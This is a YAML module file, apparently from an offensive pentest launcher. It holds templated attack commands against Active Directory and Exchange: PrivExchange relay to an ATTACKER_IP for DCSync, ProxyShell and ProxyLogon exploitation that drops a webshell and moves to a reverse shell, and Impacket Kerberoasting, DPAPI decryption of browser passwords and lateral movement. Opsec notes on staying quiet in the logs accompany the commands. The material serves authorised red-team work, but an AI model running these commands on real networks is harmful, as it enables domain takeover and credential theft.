  # ══════════════════════════════════════════════════════════════════════════════
  # EXCHANGE ATTACKS
  # ══════════════════════════════════════════════════════════════════════════════

  - id: exchange_discovery
    name: Exchange — Discovery and Version Fingerprinting
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, SUBNET]
    tags: [exchange, enum, discovery, owa, eas, ews]
    description: >
      Find Exchange servers, identify version, and check attack surface.
      Exchange servers are high-value — they run with elevated AD permissions
      by default and often have web-accessible endpoints vulnerable to relay
      or pre-auth exploits.
    commands:
      - label: "Find Exchange servers via LDAP"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=msExchExchangeServer)' 'cn dNSHostName serialNumber'"
      - label: "Find Exchange via DNS"
        cmd: "nslookup autodiscover.{DOMAIN} {DC_IP} && nslookup mail.{DOMAIN} {DC_IP}"
      - label: "Fingerprint Exchange version via OWA"
        cmd: "curl -sk https://{TARGET}/owa/auth/logon.aspx | grep -i 'X-OWA-Version\\|ExchangeServer\\|version'"
      - label: "Check EWS endpoint"
        cmd: "curl -sk -u '{USERNAME}:{PASSWORD}' https://{TARGET}/ews/exchange.asmx | head -5"
      - label: "Nmap Exchange ports"
        cmd: "nmap -sV -p 25,443,587,993,995 {TARGET}"
    opsec: >
      LDAP queries low noise. Web requests generate IIS access logs on Exchange.
    cleanup: []

  - id: exchange_privexchange
    name: PrivExchange — EWS Push Subscription Coercion → DCSync
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, TARGET, ATTACKER_IP]
    tags: [exchange, privexchange, ews, relay, dcsync, coerce]
    description: >
      PrivExchange abuses the Exchange EWS PushSubscription API to coerce the
      Exchange server (running as SYSTEM with high AD privileges) to authenticate
      to an attacker-controlled host. Relay to LDAP to grant DCSync rights.
      Exchange servers have WriteDACL on the domain object by default.
    commands:
      - label: "Terminal 1 — Start ntlmrelayx targeting LDAP"
        cmd: "impacket-ntlmrelayx -t ldap://{DC_IP} --escalate-user {USERNAME} --no-dump"
      - label: "Terminal 2 — Trigger EWS PushSubscription"
        cmd: "python3 privexchange.py -ah {ATTACKER_IP} {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN}"
      - label: "Once relay succeeds — DCSync with escalated account"
        cmd: "impacket-secretsdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -just-dc-ntlm"
      - label: "Verify DCSync rights were granted"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M daclread -o TARGET='DC=domain,DC=local' PRINCIPAL='{USERNAME}' RIGHTS='*'"
    opsec: >
      EWS subscription request logged on Exchange. LDAP relay modification
      logged on DC (4662). DCSync generates 4662 replication events.
    cleanup:
      - label: "Remove DCSync rights granted by relay"
        cmd: "impacket-dacledit -action remove -rights DCSync -principal '{USERNAME}' -target-dn 'DC=domain,DC=local' '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"

  - id: exchange_proxyshell
    name: ProxyShell — Exchange RCE Chain (CVE-2021-34473/34523/31207)
    tab: Privilege Escalation
    requires: [TARGET, DOMAIN, USERNAME, PASSWORD]
    tags: [exchange, proxyshell, rce, cve-2021-34473, pre-auth, webshell]
    description: >
      ProxyShell chains three CVEs for pre-auth RCE on Exchange. CVE-2021-34473
      (SSRF) + CVE-2021-34523 (privilege escalation) + CVE-2021-31207 (arbitrary
      file write). Results in a webshell on the Exchange server running as SYSTEM.
      Exchange 2013-2019, unpatched before May 2021 cumulative update.
    commands:
      - label: "Check if vulnerable (autodiscover endpoint test)"
        cmd: "curl -sk 'https://{TARGET}/autodiscover/autodiscover.json?@foo.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@foo.com' -v 2>&1 | grep '< HTTP'"
      - label: "Run ProxyShell exploit"
        cmd: "python3 proxyshell.py -u https://{TARGET} -e 'administrator@{DOMAIN}'"
      - label: "ProxyShell with specific email"
        cmd: "python3 proxyshell.py -u https://{TARGET} -e '{USERNAME}@{DOMAIN}' --shell"
      - label: "Access webshell after exploitation"
        cmd: "curl -sk 'https://{TARGET}/aspnet_client/webshell.aspx' -d 'cmd=whoami'"
      - label: "Upgrade to reverse shell from webshell"
        cmd: "curl -sk 'https://{TARGET}/aspnet_client/webshell.aspx' -d \"cmd=powershell -enc BASE64_REVERSE_SHELL\""
    opsec: >
      Webshell drops file to disk — IIS logs contain the request. Exploit
      attempts generate 4625 auth events. Very noisy on Exchange IIS logs.
      Check version before exploiting — may crash unpatched servers.
    cleanup:
      - label: "Remove webshell"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'del /f C:\\inetpub\\wwwroot\\aspnet_client\\webshell.aspx'"

  - id: exchange_proxylogon
    name: ProxyLogon — Exchange SSRF + RCE (CVE-2021-26855/27065)
    tab: Privilege Escalation
    requires: [TARGET, DOMAIN]
    tags: [exchange, proxylogon, ssrf, rce, cve-2021-26855, pre-auth, webshell]
    description: >
      ProxyLogon — pre-auth SSRF (CVE-2021-26855) chained with post-auth
      arbitrary file write (CVE-2021-27065). No credentials required for initial
      access. Exchange 2013-2019 before March 2021 CU. Results in SYSTEM webshell.
      Widely exploited in the wild — check for IOCs if found.
    commands:
      - label: "Check if vulnerable"
        cmd: "python3 proxylogon.py {TARGET}"
      - label: "Exploit and drop webshell"
        cmd: "python3 proxylogon.py {TARGET} {EMAIL}"
      - label: "Alternative PoC"
        cmd: "python3 CVE-2021-26855.py -t {TARGET} -e {EMAIL}"
      - label: "Check for existing compromise IOCs"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'dir C:\\inetpub\\wwwroot\\aspnet_client\\ /s /b'"
      - label: "Check Exchange logs for exploitation signs"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'findstr /i \"X-BEResource\" C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log'"
    opsec: >
      SSRF requests logged in Exchange IIS logs with X-BEResource header.
      Webshell creation logged. Very noisy. Check for existing backdoors before
      exploiting — environment may already be compromised.
    cleanup:
      - label: "Remove dropped webshell"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'del /f /s C:\\inetpub\\wwwroot\\aspnet_client\\*.aspx'"

  # ══════════════════════════════════════════════════════════════════════════════
  # IMPACKET TOOLS — Complete Coverage
  # ══════════════════════════════════════════════════════════════════════════════

  - id: impacket_recon_tools
    name: Impacket — Recon and Enumeration Tools
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, recon, enum, rpcdump, lookupsid, samrdump, netview, reg]
    description: >
      Impacket enumeration tools that complement nxc — RPC endpoint discovery,
      SID/user enumeration via SAMR and LSAT, share/session enumeration,
      and remote registry operations. Use these for targeted recon when nxc
      modules don't cover the specific need.
    commands:
      - label: "rpcdump — enumerate all RPC endpoints"
        cmd: "impacket-rpcdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}"
      - label: "rpcdump — check for specific interface (MS-RPRN for PrinterBug)"
        cmd: "impacket-rpcdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} | grep -E 'MS-RPRN|spoolss|MS-EFSRPC|MS-DFSNM'"
      - label: "lookupsid — enumerate SIDs and usernames"
        cmd: "impacket-lookupsid '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}"
      - label: "lookupsid — get domain SID"
        cmd: "impacket-lookupsid '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} | grep 'Domain SID'"
      - label: "samrdump — full SAMR user/group enumeration"
        cmd: "impacket-samrdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}"
      - label: "netview — shares and sessions across domain"
        cmd: "impacket-netview '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -target {TARGET}"
      - label: "reg — read remote registry"
        cmd: "impacket-reg '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} query -keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -s"
      - label: "reg — write registry value"
        cmd: "impacket-reg '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} add -keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -v DSRMAdminLogonBehavior -vd 2 -vt REG_DWORD"
      - label: "services — enumerate and interact with Windows services"
        cmd: "impacket-services '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} list"
      - label: "services — start a service"
        cmd: "impacket-services '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} start -name SERVICENAME"
      - label: "getPac — get Kerberos PAC for account"
        cmd: "impacket-getPac -targetUser administrator '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
    opsec: >
      RPC calls generate event 4624 (network logon). Registry writes generate
      4657. All these tools use authenticated RPC — blend with admin traffic.
    cleanup: []

  - id: impacket_dpapi
    name: Impacket — DPAPI Offline Decryption
    tab: Credential Attacks
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, dpapi, offline, decrypt, masterkey, credentials, chrome]
    description: >
      Offline DPAPI decryption using impacket-dpapi. After dumping DPAPI blobs
      from a target (browser passwords, credential manager, certificates),
      decrypt them offline using the domain backup key or user masterkey.
      The domain DPAPI backup key can decrypt any user's DPAPI data domain-wide.
    commands:
      - label: "Get domain DPAPI backup key (requires DA)"
        cmd: "impacket-dpapi backupkeys --export -t '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP}"
      - label: "Decrypt masterkey with domain backup key"
        cmd: "impacket-dpapi masterkey -file '/path/to/masterkey' -pvk domain_backup.pvk"
      - label: "Decrypt masterkey with user password"
        cmd: "impacket-dpapi masterkey -file '/path/to/masterkey' -password '{PASSWORD}' -sid 'S-1-5-21-...'"
      - label: "Decrypt credential blob with masterkey"
        cmd: "impacket-dpapi credential -file '/path/to/cred_file' -key {MASTERKEY_GUID}"
      - label: "Decrypt Chrome cookies/passwords with masterkey"
        cmd: "impacket-dpapi blob -masterkey {MASTERKEY} -data {DPAPI_BLOB}"
      - label: "NXC DPAPI module (remote collection)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --dpapi"
      - label: "NXC DPAPI Chrome passwords"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -M dpapi -o CHROME=True"
    opsec: >
      Domain backup key export generates 4662 (DPAPI key access) on DC.
      Local decryption is completely offline — no network events.
    cleanup: []

  - id: impacket_kerberos_tools
    name: Impacket — Kerberos Utilities (getTGT / getST / GetUserSPNs / GetNPUsers)
    tab: Credential Attacks
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, kerberos, tgt, tgs, spn, asrep, roasting]
    description: >
      Core Impacket Kerberos tools for ticket acquisition and roasting.
      Essential building blocks used in almost every Kerberos attack chain.
    commands:
      - label: "getTGT — get TGT with password"
        cmd: "impacket-getTGT '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
      - label: "getTGT — get TGT with NTLM hash"
        cmd: "impacket-getTGT '{DOMAIN}/{USERNAME}' -hashes :{NTLM_HASH} -dc-ip {DC_IP}"
      - label: "getTGT — get TGT with AES key"
        cmd: "impacket-getTGT '{DOMAIN}/{USERNAME}' -aesKey {AES256_KEY} -dc-ip {DC_IP}"
      - label: "getST — get service ticket (S4U2Proxy)"
        cmd: "impacket-getST -spn 'cifs/{TARGET}.{DOMAIN}' -impersonate administrator '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
      - label: "getST — constrained delegation abuse"
        cmd: "impacket-getST -spn '{TARGET_SPN}' -impersonate {TARGET_USER} '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
      - label: "GetUserSPNs — Kerberoast all SPNs"
        cmd: "impacket-GetUserSPNs '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -request -outputfile /tmp/spns.txt"
      - label: "GetUserSPNs — targeted single user"
        cmd: "impacket-GetUserSPNs '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -request-user {TARGET_USER} -outputfile /tmp/spn_target.txt"
      - label: "GetNPUsers — AS-REP roast with user list"
        cmd: "impacket-GetNPUsers '{DOMAIN}/' -no-pass -usersfile /tmp/users.txt -dc-ip {DC_IP} -format hashcat -outputfile /tmp/asrep.txt"
      - label: "GetNPUsers — with credentials (find all)"
        cmd: "impacket-GetNPUsers '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} -format hashcat -outputfile /tmp/asrep.txt"
    opsec: >
      TGT requests generate 4768. TGS requests generate 4769. Bulk roasting
      is detectable — prefer targeted requests.
    cleanup:
      - label: "Remove hash files"
        cmd: "rm -f /tmp/spns.txt /tmp/asrep.txt /tmp/spn_target.txt"

  - id: impacket_findDelegation
    name: Impacket — findDelegation (Full Delegation Enumeration)
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, delegation, unconstrained, constrained, rbcd, enum]
    description: >
      Enumerate all delegation configurations in the domain — unconstrained,
      constrained (with allowed SPNs), and resource-based constrained delegation.
      Essential for finding S4U2Proxy and unconstrained delegation attack paths.
    commands:
      - label: "Find all delegation configurations"
        cmd: "impacket-findDelegation '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Find with hash"
        cmd: "impacket-findDelegation '{DOMAIN}/{USERNAME}' -hashes :{NTLM_HASH} -dc-ip {DC_IP}"
      - label: "Filter unconstrained delegation"
        cmd: "impacket-findDelegation '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} | grep 'Unconstrained'"
      - label: "Filter constrained delegation (CIFS/HTTP SPNs)"
        cmd: "impacket-findDelegation '{DOMAIN}/{USERNAME}:{PASSWORD}' -dc-ip {DC_IP} | grep 'Constrained'"
      - label: "NXC alternative"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --find-delegation"
    opsec: >
      LDAP query — very low noise.
    cleanup: []

  - id: impacket_atexec_dcomexec
    name: Impacket — atexec / dcomexec (Scheduled Task / DCOM Execution)
    tab: Lateral Movement
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [impacket, atexec, dcomexec, lateral, scheduled-task, dcom, stealthy]
    description: >
      Alternative lateral movement methods — atexec via scheduled tasks (less
      artifact than PSExec), dcomexec via DCOM (stealthier, no service creation).
      Both useful when SMB exec is blocked or too noisy.
    commands:
      - label: "atexec — execute via scheduled task"
        cmd: "impacket-atexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} 'whoami'"
      - label: "atexec — with hash"
        cmd: "impacket-atexec '{DOMAIN}/{USERNAME}'@{TARGET} -hashes :{NTLM_HASH} 'whoami'"
      - label: "dcomexec — MMC20.Application COM object"
        cmd: "impacket-dcomexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} 'cmd.exe' -object MMC20"
      - label: "dcomexec — ShellWindows"
        cmd: "impacket-dcomexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} 'cmd.exe' -object ShellWindows"
      - label: "dcomexec — ShellBrowserWindow"
        cmd: "impacket-dcomexec '{DOMAIN}/{USERNAME}:{PASSWORD}'@{TARGET} 'cmd.exe' -object ShellBrowserWindow"
      - label: "dcomexec — with hash"
        cmd: "impacket-dcomexec '{DOMAIN}/{USERNAME}'@{TARGET} 'whoami' -hashes :{NTLM_HASH} -object MMC20"
    opsec: >
      atexec creates a scheduled task (4698/4702) — moderate noise.
      dcomexec uses COM — no service creation, quieter. Both generate 4688
      for the executed process.
    cleanup:
      - label: "atexec tasks are auto-deleted after execution"
        cmd: "echo 'atexec tasks self-cleanup after run'"

